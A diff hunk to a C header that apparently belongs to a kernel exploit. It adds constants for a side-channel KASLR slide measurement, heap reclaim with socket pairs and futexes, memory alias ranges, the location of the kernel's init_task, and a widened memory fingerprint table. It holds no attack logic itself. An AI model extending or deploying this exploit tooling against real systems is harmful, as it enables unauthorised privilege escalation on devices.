@@ -190,12 +190,37 @@
 #define SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_IMAGE 0
 #define SLIDE_SYSCTL_BOOTID_IMAGE                 0
 
+// ========== S918 / KSNITCH CONSTANTS ==========
+#define S918_RECLAIM_SOCKET_PAIRS        32
+#define S918_KSNITCH_HINT_COLLISIONS     2
+#define S918_KSNITCH_FULL_COLLISIONS     5
+#define S918_PAGE_SCAN_MAX               256
+#define S918_DMA32_SKIP_SLABS            8
+
+// ========== KSNITCH / SLIDE CONSTANTS ==========
+#define SLIDE_KSNITCH_APPENDED_FUTEXES   2048
+#define SLIDE_KSNITCH_REPEAT_MEASUREMENT 64
+#define SLIDE_KSNITCH_AVERAGE            8
+
+// ========== MM ALIAS CONSTANTS ==========
+#define MM_DMA32_ALIAS_START            0xffffffc000000000ULL
+#define MM_DMA32_ALIAS_END              0xffffffc040000000ULL
+#define MM_NORMAL_ALIAS_START           MM_DMA32_ALIAS_END
+#define MM_NORMAL_ALIAS_END             0xffffffc080000000ULL
+
+// ========== SLIDE ROOT TASK GROUP ==========
+#define SLIDE_ROOT_TASK_GROUP_IMAGE     (KIMAGE_TEXT_BASE + OFFSET_init_task)
+#define SLIDE_ROOT_TASK_GROUP           SLIDE_ROOT_TASK_GROUP_IMAGE
+
 // ========== P0 FINGERPRINT DEFINITIONS ==========
-#define P0_FINGERPRINT_WORDS 4
+#define P0_FINGERPRINT_WORDS 16
 #define P0_FINGERPRINT { 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 }
 
 static const unsigned long long p0_fingerprint_offsets[P0_FINGERPRINT_WORDS] = {
-    0x0000, 0x0008, 0x0010, 0x0018
+    0x0000, 0x0008, 0x0010, 0x0018,
+    0x0020, 0x0028, 0x0030, 0x0038,
+    0x0040, 0x0048, 0x0050, 0x0058,
+    0x0060, 0x0068, 0x0070, 0x0078
 };
 
 struct p0_fingerprint {
